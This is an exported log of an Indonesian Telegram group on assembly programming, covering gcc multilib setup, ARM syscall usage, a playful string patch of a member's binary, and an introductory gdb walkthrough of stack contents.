+1140,0,,20,10,2019,23,55,30,Oncom,,0,Mas_ocm
+1141,0,,21,10,2019,3,19,26,linkonet.mediaid,,0,cso_linkonetmediaid
+1142,0,,21,10,2019,11,22,33,**,,13392009879,
+1143,0,,22,10,2019,2,57,51,,,0,
+1144,0,,23,10,2019,14,54,37,ki,,0,rizkiRnAnndt
+1146,0,,25,10,2019,3,25,21,Wibowo,,0,Wiibowo
+1149,0,,28,10,2019,17,1,31,Sirajul,Wathani,0,wathony
+1150,0,https://pentestmag.com/holy-book-x86/,31,10,2019,2,45,33,Birowo,,0,b1r0w0
+1151,0,,1,11,2019,11,31,52,Pebrido,Sihaloho,0,Pebridosihaloho
+1152,0,,9,11,2019,17,10,39,,,0,
+1153,0,,9,11,2019,17,39,56,Penghulu,K.U.A,0,ahmad_mootayun
+1154,0,,10,11,2019,1,23,36,,,0,
+1155,0,,15,11,2019,23,36,58,Eryk,BP,0,proferyk
+1156,0,,16,11,2019,13,27,12,,,0,
+1158,0,,17,11,2019,18,51,4,,,0,
+1159,0,Hello guys,17,11,2019,18,51,9,,,0,
+1160,0,,18,11,2019,18,34,21,,,0,
+1161,0,,19,11,2019,3,46,56,,,0,
+1162,0,,19,11,2019,22,16,21,,,0,
+1163,0,,21,11,2019,15,28,6,Sagar,Dabhole,0,
+1164,0,,23,11,2019,3,15,34,winger,,0,newlisp
+1165,0,,23,11,2019,8,42,51,Ariandy,,0,ooxyz
+1166,0,,24,11,2019,16,12,21,,,0,
+1167,0,,25,11,2019,15,54,2,....,,0,My_1223
+1168,0,,26,11,2019,1,21,51,Khairul,Mhd,0,khairul_muhammad
+1169,0,,26,11,2019,14,10,8,Host,Xyz,0,HostXyz
+1170,0,,26,11,2019,14,10,8,Host,Xyz,0,HostXyz
+1171,0,,26,11,2019,14,10,10,Host,Xyz,0,HostXyz
+1172,0,,28,11,2019,0,44,18,Eka Putri,Irianti,0,
+1173,0,,28,11,2019,8,31,35,,,0,
+1174,0,,28,11,2019,8,46,23,Will,,0,william_suarez
+1175,0,"Maaf mengganggu member2 sekalian.. saya mau bertanya.. saya mau compile bahasa assembly sederhana tapi tidak bisa.. setelah saya browsing2 ,saya lihat persoalannya saya compile dengan cara 32bit .. tapi saya tidak menemukan script yg tepat untuk 64 bit untuk program saya. Mohon bantuannya rekan2 sekalian 🙏🏻",28,11,2019,9,1,59,Will,,0,william_suarez
+1176,0,,28,11,2019,9,1,59,Will,,0,william_suarez
+1177,0,"Di gcc, coba tambahkan opsi -m32",28,11,2019,9,11,42,Andre,,0,anta40
+1178,0,"gcc 64 bit by default generate 64-bit code sih, bukan 32",28,11,2019,9,12,17,Andre,,0,anta40
+1179,0,gcc -m32 add.o,28,11,2019,9,14,31,Will,,0,william_suarez
+1180,0,Gitu ya?,28,11,2019,9,14,35,Will,,0,william_suarez
+1181,0,"iya. untested sih, lagi gak ada kompie linux hehe",28,11,2019,9,33,38,Andre,,0,anta40
+1182,1181,Sejauh ini saya coba begini belum berhasil juga,28,11,2019,9,34,41,Will,,0,william_suarez
+1183,0,ya install dulu package gcc-multilibnya,28,11,2019,9,35,31,Andre,,0,anta40
+1184,0,Itu saya sudah coba install tapi gagal,28,11,2019,9,36,22,Will,,0,william_suarez
+1185,0,Cara install yg bener gimana ya pak?,28,11,2019,9,36,31,Will,,0,william_suarez
+1186,1183,Itu comand saya salah nya dimana ya?,28,11,2019,9,36,57,Will,,0,william_suarez
+1187,0,hmm bisa kok,28,11,2019,9,40,45,Andre,,0,anta40
+1188,0,"Coba aja search apt-cache search gcc | grep multilib. haha saya lupa mana aja yg saya install. saya pakai Debian Sid sih, btw 😅",28,11,2019,9,44,19,Andre,,0,anta40
+1189,0,,28,11,2019,10,16,11,Diem Diem Bae,,0,kasihusername
+1190,0,,28,11,2019,13,12,32,Flavino,,0,r9aikensan
+1191,0,,28,11,2019,20,35,37,,,0,
+1192,0,,28,11,2019,21,5,24,,,0,
+1193,0,,29,11,2019,22,0,42,Keukeu,Nurjanah,0,keukeunurjanah
+1194,0,,1,12,2019,16,43,27,Faiz,,0,alfaidzin
+1195,0,,2,12,2019,1,51,47,Hamid,,0,Hamid_LC1
+1196,0,,2,12,2019,5,9,44,,,0,
+1197,0,,3,12,2019,8,2,44,Iwan,Aldiansyah,0,ThefoxAzubirs
+1200,1199,Operasi file gimana 🤔,3,12,2019,12,39,5,Moriah,Soewako,0,soewako
+1201,0,Nomor syscall-nya gitu?,3,12,2019,12,40,41,Moriah,Soewako,0,soewako
+1203,1202,"- [Linux syscall ABI (register mana isinya apa)](https://gist.github.com/yamnikov-oleg/454f48c3c45b735631f2#file-calling_conventions-md)\n- [Daftar nomor syscall Aarch64](https://github.com/torvalds/linux/blob/v4.17/include/uapi/asm-generic/unistd.h)\n- [Untuk parameter & kembaliannya, bisa lihat di halaman manual syscall masing-masing](https://linux.die.net/man/2/)",3,12,2019,13,20,10,Moriah,Soewako,0,soewako
+1204,0,Ini bukan? 🤔,3,12,2019,13,20,16,Moriah,Soewako,0,soewako
+1205,0,,3,12,2019,13,29,25,,,0,
+1206,0,哈哈,3,12,2019,13,29,33,,,0,
+1207,0,卧槽讲的都是啥玩意儿,3,12,2019,13,29,47,,,0,
+1208,0,根本看不懂,3,12,2019,13,29,52,,,0,
+1209,0,Do you able to talk English?,3,12,2019,13,33,54,ZakiNadhif,,0,zndf0
+1212,1210,"Ya selama kernel-nya masih Linux ya sama aja, mau di komputer mau di HP (?)",3,12,2019,13,36,14,Moriah,Soewako,0,soewako
+1213,1207,"Does this mean ""Liberate Hong Kong, revolution now""? 🤔",3,12,2019,13,37,47,Moriah,Soewako,0,soewako
+1215,1213,"Wait, what does that have to do with assembly programming?",3,12,2019,13,39,28,ZakiNadhif,,0,zndf0
+1216,1209,no i can,3,12,2019,13,40,28,,,0,
+1217,0,i will speak english a little,3,12,2019,13,40,41,,,0,
+1219,0,my english is very good,3,12,2019,13,40,50,,,0,
+1220,0,and my english is my third langauge,3,12,2019,13,41,9,,,0,
+1221,0,my sencond language is japanese,3,12,2019,13,41,19,,,0,
+1222,0,my first language is java,3,12,2019,13,41,39,,,0,
+1223,1214,"Uhhhh... oke, jadi Aarch64 buat komputer sama buat HP beda, meski sama-sama pakai kernel Linux?",3,12,2019,13,41,59,Moriah,Soewako,0,soewako
+1224,0,"u, not speak english",3,12,2019,13,42,18,,,0,
+1225,1215,,3,12,2019,13,42,39,Moriah,Soewako,0,soewako
+1227,1226,"Ya, dan tabel-tabel yang aku kasih tadi buat Aarch64 semua om 👀",3,12,2019,13,46,11,Moriah,Soewako,0,soewako
+1229,0,Uhhh... oke? Jadi karena modify ABI-nya juga beda?,3,12,2019,13,47,43,Moriah,Soewako,0,soewako
+1230,1224,"The name is a bit misleading, It's actually an Indonesian group. Isn't it? But you can ask anything here about assembly programming, cus some of us also talk English, well it isn't the primary language tho.",3,12,2019,13,49,29,ZakiNadhif,,0,zndf0
+1231,1227,nih ada keteranganmya x86_64 architecture,3,12,2019,13,54,15,Iwan,Aldiansyah,0,ThefoxAzubirs
+1232,1231,"Yup, tapi Aarch64 pakainya berkas itu\nAgak membingungkan memang komentarnya\nhttps://unix.stackexchange.com/a/499016",3,12,2019,14,8,12,Moriah,Soewako,0,soewako
+1233,0,"Atau ini, kalau mau yang bentuk tabel langsung\nhttps://fedora.juszkiewicz.com.pl/syscalls.html",3,12,2019,14,10,36,Moriah,Soewako,0,soewako
+1234,1233,"nah ini kan belum jelas register2 yg dipakai.\ncontoh...untuk ARM read (3)...,angka 3 mau dimasukkan ke register apa dan kebutuhan register lainnya tidak disebutkan. \nDan read di svc ini apakah read dalam memasukan user input atau dalam read isi file.\nKalau sudah baca script 32foxR1.s dari ane, ini read untuk user input. Rasanya tabel ini masih butuh kelanjutan keterangan, coz tanpa itu kita cuma bisa tebak2an",3,12,2019,14,44,23,Iwan,Aldiansyah,0,ThefoxAzubirs
+1235,1234,Ada di link aku yang pertama om 👀,3,12,2019,14,45,9,Moriah,Soewako,0,soewako
+1236,1234,"Read user input dan read isi file itu sebenernya sama, dia nerima nomor ""file descriptor"" (fd)\nKalau untuk user input, biasanya udah dibikinin fd 0 sama kernel\nKalau mau baca dari file, pertama buka dulu file-nya pakai open(), nanti dia bakal ngembaliin nomor fd-nya\nNah, nomor itu yang nanti dipakai buat parameter read()",3,12,2019,14,47,41,Moriah,Soewako,0,soewako
+1237,0,"Jadi kurang lebihnya:\n`fd = open(""/path/to/file"")\nread(fd, &buf, nbytes)`\nUntuk assembly tinggal nyesuaiin nomor & register sesuai dua tabel tadi 👀",3,12,2019,14,49,45,Moriah,Soewako,0,soewako
+1239,1238,"- [Syscall number](https://fedora.juszkiewicz.com.pl/syscalls.html) masuk di x8.\n- Kalau seandainya [syscall-nya](https://linux.die.net/man/2/) nerima parameter-parameter tertentu, taruh parameternya di x0 sd. x5.\n- Selesai setup, panggil svc #0 biar dijalanin.\n- Kalau udah selesai, kembalian-nya ada di x0.",3,12,2019,14,58,26,Moriah,Soewako,0,soewako
+1240,0,Itu ada semua kok di tabelnya om 👀,3,12,2019,14,59,4,Moriah,Soewako,0,soewako
+1241,1237,"gini....contoh aja.....\nmov r0,$1\nldr r1,%namafile\nmov r2,$pjgfile\nmov r7,$3 @ini fungsi read\nsvc #0 \n\n@kalau ditampilkan ke layar pake fungsi r7=4 bukan isi file yg akan tampil tapi namafile nya doang\n\nmov r0,1\nldr r1,=namafile\nmov r2,panjangfile\nmov r7,$4 @ni kita tampilkan \nsvc #0\n\n@nah gimana cara lihat isi filenya?",3,12,2019,15,1,32,Iwan,Aldiansyah,0,ThefoxAzubirs
+1242,1241,"```# ARM32/EABI ya\n\n# r0 = open(pathtofile, 0)\nldr r0, =pathtofile\nmov r1, $0\nmov r7, $5\nsvc #0\n\n# Baca 32 byte dari file\n# read(r0, buf, 32)\n# r0 udah ada dari hasil open() sebelumnya\nldr r1, =buf\nmov r2, $32\nmov r7, $3\nsvc #0\n\n# Sekarang, `buf` isinya 32 byte pertama dari file-nya\n# Syscall read()-nya bisa diulang-ulang seperlunya\n# sampai seluruh file-nya kebaca```",3,12,2019,15,15,16,Moriah,Soewako,0,soewako
+1243,0,Gini?,3,12,2019,15,15,18,Moriah,Soewako,0,soewako
+1244,0,"open() dulu, nanti dapat fd-nya, baru di-read()",3,12,2019,15,18,27,Moriah,Soewako,0,soewako
+1246,1245,"Ya bikin dulu buffer-nya di awal, alokasikan pakai `.bss` atau sejenisnya, sama persis kaya kalau mau baca input dari pengguna",3,12,2019,15,20,30,Moriah,Soewako,0,soewako
+1247,0,Nanti kita pakai itu buat read(),3,12,2019,15,20,50,Moriah,Soewako,0,soewako
+1250,1249,,3,12,2019,15,33,49,Moriah,Soewako,0,soewako
+1251,1248,,3,12,2019,15,35,9,Moriah,Soewako,0,soewako
+1252,0,"Udah terlanjur bikin programnya, sayang kalau gak di-upload 🙈",3,12,2019,15,35,26,Moriah,Soewako,0,soewako
+1254,0,"Wah kalau itu ku nggak tahu, gak pernah ngoding ARM 🙈",3,12,2019,15,36,26,Moriah,Soewako,0,soewako
+1256,1255,"Aku compile juga hasilnya pasti beda, aku gak di Linux ini",3,12,2019,15,36,48,Moriah,Soewako,0,soewako
+1259,1258,OpenBSD,3,12,2019,15,37,25,Moriah,Soewako,0,soewako
+1261,1198,Tergantung OS nya kan. Maaf ngoding ARM sebatas ngitung aritmatika di Raspberry Pi hehe. Kecuali baremetal (tanpa OS),3,12,2019,15,58,42,Andre,,0,anta40
+1262,1261,Pernah bikin baremetal di ARM om?,3,12,2019,16,0,39,Moriah,Soewako,0,soewako
+1263,0,Blom. Di Raspberry pi juga pake Linux sih,3,12,2019,16,1,41,Andre,,0,anta40
+1294,1273,Bikin cross platform mobile apps pake ASM? Sounds interesting tapi seberapa banyak dev yg mau tackle? :d,4,12,2019,4,51,14,Andre,,0,anta40
+1295,0,:D,4,12,2019,4,51,21,Andre,,0,anta40
+1296,1281,"Ya emang. Suka2 yg bikin assembler. Di x86 aja ada MASM, NASM, goasm dst. Gak ada standar ISO-nya kayak C/C++",4,12,2019,4,53,15,Andre,,0,anta40
+1301,0,,4,12,2019,14,22,7,chandra agung rizky,,0,born2ngopi
+1302,0,Halo,4,12,2019,14,23,46,Ari Dwi,Prayogo,0,Aridwiprayogo
+1306,0,,7,12,2019,1,47,6,,,0,
+1307,0,"Hey guys, So JavaScript has been on🔥for the last 5 years breaking bones in its wake. But a new king is on the horizon Rust > WebAssembly Svelte is a wonderful JavaScript compiler I use it in place of React. Take the survey and compare them😁\n@DevEconomics\nhttps://t.co/Aylzw0ACtd",7,12,2019,1,47,14,,,0,
+1311,1299,Wah kamu @heker y 🤔,7,12,2019,8,31,35,,,0,
+1315,0,[thefox](tg://user?id=1056169208) sabar mas,7,12,2019,9,18,30,ZakiNadhif,,0,zndf0
+1316,0,Wkwk,7,12,2019,9,18,45,ZakiNadhif,,0,zndf0
+1325,0,Bisa sangad,7,12,2019,9,32,32,ZakiNadhif,,0,zndf0
+1327,0,Wah coba liat masnya bisa ngeprogram pake bahasa assembly gitu,7,12,2019,9,34,14,ZakiNadhif,,0,zndf0
+1330,0,,7,12,2019,9,39,8,Host,Xyz,0,HostXyz
+1332,0,[thefox](tg://user?id=1056169208) gini ni kalem,7,12,2019,9,44,24,ZakiNadhif,,0,zndf0
+1333,0,Sudah-sudah jangan bertengkar 👀,7,12,2019,10,3,23,Moriah,Soewako,0,soewako
+1346,1338,"Ok, bentar lagi saya coba.",7,12,2019,11,12,59,Ammar Faizi,,0,ammarfaizi2
+1350,1335,"Nggak ada bedanya, cuma tanpa symbol table.",7,12,2019,11,56,43,Ammar Faizi,,0,ammarfaizi2
+1351,1349,Oalah,7,12,2019,11,56,58,Ammar Faizi,,0,ammarfaizi2
+1354,0,Ok,7,12,2019,12,6,8,Ammar Faizi,,0,ammarfaizi2
+1356,0,"Iya, baru mau buka, bentar.",7,12,2019,12,7,7,Ammar Faizi,,0,ammarfaizi2
+1360,0,Baru kelar lol.,7,12,2019,12,46,47,Ammar Faizi,,0,ammarfaizi2
+1361,0,Nggak masalah proteksinya sih.,7,12,2019,12,46,58,Ammar Faizi,,0,ammarfaizi2
+1362,0,Kalau asal ngedit ngerusak warna soalnya.,7,12,2019,12,47,19,Ammar Faizi,,0,ammarfaizi2
+1363,0,"Ini patchnya\n\n```<?php\n$r1 = str_split(""theFoxAzubirs"");\n$r2 = str_split(""Ammar Faizi~~"");\n$x = file_get_contents(""32foxrcv1"");\n$a = substr($x, 0, $i = 0x100 + 4);\n$b = substr($x, $j = 0x150 + 1);\n$c = str_split(substr($x, $i, $j - $i));\n$p = 0;\nforeach ($c as &$v)\n$v == $r1[$p] and ($v = $r2[$p] xor $p++);\nfile_put_contents(""axc"", $a.implode($c).$b);```",7,12,2019,12,47,46,Ammar Faizi,,0,ammarfaizi2
+1364,0,"Should be very easy if I used hexeditor. But, I didn't.",7,12,2019,12,48,21,Ammar Faizi,,0,ammarfaizi2
+1369,1365,"Ok pak, semoga lancar.",7,12,2019,13,12,46,Ammar Faizi,,0,ammarfaizi2
+1370,1366,"Apanya yang jago, cuma gesar-geser string doang padahal.",7,12,2019,13,13,16,Ammar Faizi,,0,ammarfaizi2
+1375,1374,"Oalah, gpp kalau di situ.",7,12,2019,16,44,13,Ammar Faizi,,0,ammarfaizi2
+1376,0,,8,12,2019,7,31,16,,,0,
+1377,0,,8,12,2019,11,51,35,Janu,Tjatur,0,smartpeople00
+1378,0,Hallo,8,12,2019,11,51,41,Janu,Tjatur,0,smartpeople00
+1379,0,Ada yang bisa ajarin saya assembly dari 0?,8,12,2019,11,51,52,Janu,Tjatur,0,smartpeople00
+1380,0,nyari temen belajar RE ada yang mau membimbing ?,8,12,2019,11,53,2,Shinji,Ikari,0,gh0zialfat1h
+1381,0,@soewako ama @ammarfaizi2 ni master2nya,8,12,2019,12,5,56,Iwan,Aldiansyah,0,ThefoxAzubirs
+1383,0,Contoh option yang harus dipilih apa aja?,8,12,2019,12,14,53,Janu,Tjatur,0,smartpeople00
+1384,1381,mohon bimbingannya,8,12,2019,12,15,9,Shinji,Ikari,0,gh0zialfat1h
+1386,0,Yang 16bit dkk itu maksudnya gimana?,8,12,2019,13,8,21,Janu,Tjatur,0,smartpeople00
+1387,0,Tergantung devicenya gitu?,8,12,2019,13,8,21,Janu,Tjatur,0,smartpeople00
+1388,0,Yang paling pertama harus dipelajari itu apa?,8,12,2019,13,9,8,Janu,Tjatur,0,smartpeople00
+1389,0,Saya pm aja,8,12,2019,13,9,17,Janu,Tjatur,0,smartpeople00
+1390,1379,"Yuk belajar bareng mas. Dr jaman SMA (2001) ampe skrg masih blom bisa. Mana kerjaan juga gak jauh2 dr ""kopi Jawa"" ahahaha",8,12,2019,13,15,19,Andre,,0,anta40
+1395,0,Assembly itu masih worth it g sih di 2019 - tahun mendatang,8,12,2019,13,22,55,Janu,Tjatur,0,smartpeople00
+1396,1390,"Waduh saya aja lagi belajar jawa, tapi ini masih fokus belajar berlian dulu",8,12,2019,13,23,21,Janu,Tjatur,0,smartpeople00
+1398,1395,"kalau untuk develop user apps pada umumnya, wah praktis gak kepake sih. saya belum pernah liat full stack dev yg salah satu requirement-nya paham x86 assembly",8,12,2019,13,25,33,Andre,,0,anta40
+1399,0,Sudah jadul mungkin,8,12,2019,13,26,3,Janu,Tjatur,0,smartpeople00
+1400,1381,"Saya gak terlalu mahir di RE, uh.",8,12,2019,13,27,17,Ammar Faizi,,0,ammarfaizi2
+1402,1384,Saat ini sedang belajar arsitektur apa bahasa Assembly-nya mas?,8,12,2019,13,27,40,Ammar Faizi,,0,ammarfaizi2
+1403,1401,Wasm di web dev fungsinya apa?,8,12,2019,13,28,24,Janu,Tjatur,0,smartpeople00
+1404,0,Wasm = WebAssembly?,8,12,2019,13,28,55,Janu,Tjatur,0,smartpeople00
+1405,0,"temen"" disini klo boleh tau sebenarnya belajar asm dari tuntutan kerjaan ato sebagai hobi aja?",8,12,2019,13,29,13,Wizard,,0,nyxsorcerer
+1406,1399,"bukan jadul sih. yang lebih tepat: niche-nya menyempit. gak jauh2 dr kernel developer (nyatanya bikin OS bisa kira2 10% assembly kek linux), embedded developer, compiler developer (gak kebayang compiler dev gak paham assembly)",8,12,2019,13,29,17,Andre,,0,anta40
+1407,1406,Hmm saya sih lebih tertarik ke mobile dev,8,12,2019,13,30,9,Janu,Tjatur,0,smartpeople00
+1408,0,"So, saya g jadi belajar:v",8,12,2019,13,30,28,Janu,Tjatur,0,smartpeople00
+1409,1395,"Seharusnya masih, itu bahasa yang berdiri di belakang semua programming language lainnya. Tanpa Assembly kita nggak bisa mengoperasikan micro(processor/controller).",8,12,2019,13,30,32,Ammar Faizi,,0,ammarfaizi2
+1411,1409,Owalah,8,12,2019,13,31,52,Janu,Tjatur,0,smartpeople00
+1412,1408,"atau belajar aja, tapi sekedar buat asah otak. mindset yg sama kenapa saya belajar haskell dan lisp (paradigma lain yg beda 180 derajat dengan assembly). kepake di kerjaan kantor? sama sekali nggak.",8,12,2019,13,32,0,Andre,,0,anta40
+1413,1405,Saya dua-duanya sih pak.,8,12,2019,13,32,30,Ammar Faizi,,0,ammarfaizi2
+1414,1410,Bisa Assembly minimal lah.,8,12,2019,13,33,7,Ammar Faizi,,0,ammarfaizi2
+1415,1412,"Iya juga sih, buat pegangan kalau suatu saat dipake",8,12,2019,13,34,6,Janu,Tjatur,0,smartpeople00
+1416,0,Tapi ini masih fokus ke berlian dulu ama penguin,8,12,2019,13,34,6,Janu,Tjatur,0,smartpeople00
+1417,0,Belajar asm = pegangan kalau mau lfs (Maybe:*),8,12,2019,13,34,14,Janu,Tjatur,0,smartpeople00
+1418,0,"LFS = linux from scratch? keknya dulu nyoba LFS banyakan setting ini itu, script ini itu deh",8,12,2019,13,35,2,Andre,,0,anta40
+1419,0,ngga nyentuh assembly,8,12,2019,13,35,11,Andre,,0,anta40
+1420,1418,"Iya, setau saya juga gini.",8,12,2019,13,35,26,Ammar Faizi,,0,ammarfaizi2
+1421,0,LFS nggak nyentuh Assembly.,8,12,2019,13,35,32,Ammar Faizi,,0,ammarfaizi2
+1424,1418,G berurusan ama kernel?,8,12,2019,13,37,34,Janu,Tjatur,0,smartpeople00
+1425,1424,Compile kernel nggak harus ngerti Assembly.,8,12,2019,13,39,1,Ammar Faizi,,0,ammarfaizi2
+1426,1423,Bener,8,12,2019,13,39,31,Ammar Faizi,,0,ammarfaizi2
+1427,0,Sekarang kalau belajar C ya tetep harus ada pengetahuan Assembly-nya.,8,12,2019,13,39,47,Ammar Faizi,,0,ammarfaizi2
+1428,0,Minimal x86 lah.,8,12,2019,13,39,55,Ammar Faizi,,0,ammarfaizi2
+1429,0,uwu,8,12,2019,13,40,56,Ammar Faizi,,0,ammarfaizi2
+1430,1402,Sebenarnya lebih ke REnya langsung,8,12,2019,13,41,9,Shinji,Ikari,0,gh0zialfat1h
+1431,1424,"linux itu porsi code assemblynya kecil banget. paling 10% aja, mayoritasnya C",8,12,2019,13,41,39,Andre,,0,anta40
+1432,0,Assembly sudah tahu dasar2nya,8,12,2019,13,41,45,Shinji,Ikari,0,gh0zialfat1h
+1433,1430,RE langsung itu gimana?,8,12,2019,13,41,50,Ammar Faizi,,0,ammarfaizi2
+1434,0,"Dahlah g jadi belajar, g cocok aink",8,12,2019,13,43,3,Janu,Tjatur,0,smartpeople00
+1435,1433,Langsung belajar tentang bagaimana ngebongkarnya serta penggunaan tool tool dan menemukan buffer yang bisa di overwrite,8,12,2019,13,44,26,Shinji,Ikari,0,gh0zialfat1h
+1436,1435,"Menarik, toolnya apa itu mas?\nSaya malah baru tau ada tool bisa menemukan buffer yang bisa dioverwrite?",8,12,2019,13,48,42,Ammar Faizi,,0,ammarfaizi2
+1437,0,"Saya biasanya manual baca instruction dan addressnya, kalau sectionnya di .rodata atau .text berarti read only data, kalau sectionnya di .data atau .bss berarti writeable, dan kasus-kasus lainnya.",8,12,2019,13,48,42,Ammar Faizi,,0,ammarfaizi2
+1438,1436,Gak ada tool yang bisa nemuin maksudnya penggunaan tool toolnya mas,8,12,2019,13,49,42,Shinji,Ikari,0,gh0zialfat1h
+1439,0,Kayak radare2,8,12,2019,13,49,46,Shinji,Ikari,0,gh0zialfat1h
+1440,0,Ghidra dan sejenisnya,8,12,2019,13,49,51,Shinji,Ikari,0,gh0zialfat1h
+1441,0,Penggunaan gdb aja ane belum paham betul,8,12,2019,13,50,3,Shinji,Ikari,0,gh0zialfat1h
+1442,0,Oalah,8,12,2019,13,50,28,Ammar Faizi,,0,ammarfaizi2
+1443,0,Kalau pakai ghidra memang bisa baca hasil decompilednya sih.,8,12,2019,13,50,44,Ammar Faizi,,0,ammarfaizi2
+1445,0,Serasa baca code C. Tapi kadang masih nggak cocok dengan behavior aslinya (terumata kalau kena optimization hasilnya jadi bias).,8,12,2019,13,51,18,Ammar Faizi,,0,ammarfaizi2
+1446,1443,acak2an gak kayak ida apalagi buat newbie kayak saya,8,12,2019,13,51,21,Shinji,Ikari,0,gh0zialfat1h
+1447,1444,Yaudah belajar pakai gdb aja dulu kita.,8,12,2019,13,51,44,Ammar Faizi,,0,ammarfaizi2
+1448,0,menentukan nilai stack yang bisa di overwrite gitu mas,8,12,2019,13,51,55,Shinji,Ikari,0,gh0zialfat1h
+1450,1448,"Uh, semua stack itu writable mas, bisa dioverwrite.",8,12,2019,13,52,30,Ammar Faizi,,0,ammarfaizi2
+1451,0,Yang nggak bisa diwrite itu section .text dan .rodata.,8,12,2019,13,52,41,Ammar Faizi,,0,ammarfaizi2
+1452,1450,hmmm begitu yah,8,12,2019,13,52,47,Shinji,Ikari,0,gh0zialfat1h
+1453,0,"Iya, saya coba beri contoh setelah ini.",8,12,2019,13,53,30,Ammar Faizi,,0,ammarfaizi2
+1454,0,.rodata itu section khusus menyimpan read only data.\n.bss itu section khusus menyimpan uninitialized data.\n.data itu section khusus menyimpan initialized data.\n.text itu section khusus menyimpan instructions.,8,12,2019,13,54,16,Ammar Faizi,,0,ammarfaizi2
+1455,0,Untuk stack dia nggak hidup di dalam map filenya.,8,12,2019,13,54,37,Ammar Faizi,,0,ammarfaizi2
+1456,1454,nah itu alhamduliillah sya sudah pahami mas,8,12,2019,13,54,40,Shinji,Ikari,0,gh0zialfat1h
+1457,0,Dia cuma ada ketika programnya jalan.,8,12,2019,13,54,45,Ammar Faizi,,0,ammarfaizi2
+1458,0,Yang mengendalikan alokasi stack namanya register RSP.,8,12,2019,13,55,9,Ammar Faizi,,0,ammarfaizi2
+1459,0,"Btw, saya bahas x64 ya.",8,12,2019,13,55,15,Ammar Faizi,,0,ammarfaizi2
+1460,0,"Untuk arsitektur lainnya mungkin beda register, tapi untuk stack tetep sama-sama gitu cara kerjanya.",8,12,2019,13,55,57,Ammar Faizi,,0,ammarfaizi2
+1461,0,/me buka text editor dulu.,8,12,2019,13,56,4,Ammar Faizi,,0,ammarfaizi2
+1462,0,/me,8,12,2019,13,56,50,Shinji,Ikari,0,gh0zialfat1h
+1464,0,Ini contoh hello world yang tanpa stack.,8,12,2019,14,2,53,Ammar Faizi,,0,ammarfaizi2
+1465,0,,8,12,2019,14,3,4,Ammar Faizi,,0,ammarfaizi2
+1466,1463,"Ya mungkin gak beda jauh, ada SP-nya lah. Mirip dikit.",8,12,2019,14,3,23,Ammar Faizi,,0,ammarfaizi2
+1467,0,Ini yang pakai stack.,8,12,2019,14,6,10,Ammar Faizi,,0,ammarfaizi2
+1468,0,hmmm begitu yah,8,12,2019,14,6,40,Shinji,Ikari,0,gh0zialfat1h
+1469,0,,8,12,2019,14,7,24,Ammar Faizi,,0,ammarfaizi2
+1470,0,"Misal kalau kita mulai dari sini, sudah paham maksud instructionnya mas?",8,12,2019,14,8,39,Ammar Faizi,,0,ammarfaizi2
+1471,0,"Next, coba kita overwrite nilai di stacknya.",8,12,2019,14,10,51,Ammar Faizi,,0,ammarfaizi2
+1472,1470,inshaa alloh  mas,8,12,2019,14,22,17,Shinji,Ikari,0,gh0zialfat1h
+1473,0,"Ok, nyoba dikit aja, cara membaca dan overwrite isi stack dengan gdb.",8,12,2019,14,28,54,Ammar Faizi,,0,ammarfaizi2
+1474,0,Awalnya saya sarankan pakai extension gef.,8,12,2019,14,29,6,Ammar Faizi,,0,ammarfaizi2
+1475,0,Biar enak dibaca.,8,12,2019,14,29,12,Ammar Faizi,,0,ammarfaizi2
+1476,0,Bisa didapat dari sini https://github.com/hugsy/gef,8,12,2019,14,29,17,Ammar Faizi,,0,ammarfaizi2
+1477,0,oke siap mas thanks sebelumnya,8,12,2019,14,29,34,Shinji,Ikari,0,gh0zialfat1h
+1478,0,Cara masuk ke gdb-nya gini.\n\nKetik `gdb namafile`.,8,12,2019,14,30,5,Ammar Faizi,,0,ammarfaizi2
+1479,0,Anggap saja kita reverse file yang bukan stripped binary.,8,12,2019,14,30,26,Ammar Faizi,,0,ammarfaizi2
+1480,0,Jadi masih ada label-nya.,8,12,2019,14,30,30,Ammar Faizi,,0,ammarfaizi2
+1481,1467,Di sini nama label-nya _start.,8,12,2019,14,30,42,Ammar Faizi,,0,ammarfaizi2
+1482,0,Jadi bisa kita pasang breakpoint based on nama labelnya.,8,12,2019,14,30,52,Ammar Faizi,,0,ammarfaizi2
+1483,0,Cara pasang breakpoint-nya ketik `b _start`,8,12,2019,14,31,23,Ammar Faizi,,0,ammarfaizi2
+1484,0,"Setelah itu kita jalankan programnya, ketik `r`.",8,12,2019,14,31,40,Ammar Faizi,,0,ammarfaizi2
+1485,0,Ini tampilannya setelah ketik `r`.,8,12,2019,14,32,32,Ammar Faizi,,0,ammarfaizi2
+1486,0,Kotak yang atas itu nilai registernya.\nKotak bawahnya itu nilai stack.\nKotak bawahnya lagi itu instruction yang sedang dijalankan.\nKotak bawahnya posisi threads.\nKotak bawahnya lagi trace.,8,12,2019,14,34,2,Ammar Faizi,,0,ammarfaizi2
+1487,0,"Setelah alokasi stack, defaultnya langsung bernilai 0.",8,12,2019,14,34,22,Ammar Faizi,,0,ammarfaizi2
+1488,0,```0x00007fffffffe38b│+0x0000: 0x0000000000000000   ← $rsp\n0x00007fffffffe393│+0x0008: 0x0000000000000000\n0x00007fffffffe39b│+0x0010: 0x0000010000000000\n0x00007fffffffe3a3│+0x0018: 0xffe6370000000000\n0x00007fffffffe3ab│+0x0020: 0x00000000007fffff\n0x00007fffffffe3b3│+0x0028: 0xffe6510000000000\n0x00007fffffffe3bb│+0x0030: 0xffe66100007fffff\n0x00007fffffffe3c3│+0x0038: 0xffe67200007fffff```,8,12,2019,14,34,32,Ammar Faizi,,0,ammarfaizi2
+1489,0,Bagian yang ditunjuk oleh RSP itu puncak stacknya.,8,12,2019,14,34,49,Ammar Faizi,,0,ammarfaizi2
+1490,0,Setelah itu ketik `ni` (next instruction).,8,12,2019,14,35,3,Ammar Faizi,,0,ammarfaizi2
+1491,0,"Sampai stack terisi dengan ""Hello World!"".",8,12,2019,14,35,13,Ammar Faizi,,0,ammarfaizi2
+1492,0,,8,12,2019,14,35,59,Ammar Faizi,,0,ammarfaizi2
+1493,0,"Di situ address `0x00007fffffffe38b` (peak stack) ngarah ke string ""Hello World!""-nya.",8,12,2019,14,36,50,Ammar Faizi,,0,ammarfaizi2
+1494,0,Untuk ngecek detail isinya bisa pakai hexdump byte.,8,12,2019,14,37,0,Ammar Faizi,,0,ammarfaizi2
+1495,0,,8,12,2019,14,37,4,Ammar Faizi,,0,ammarfaizi2
+1496,0,Di sini bisa dilihat jelas isinya perbyte.,8,12,2019,14,37,12,Ammar Faizi,,0,ammarfaizi2
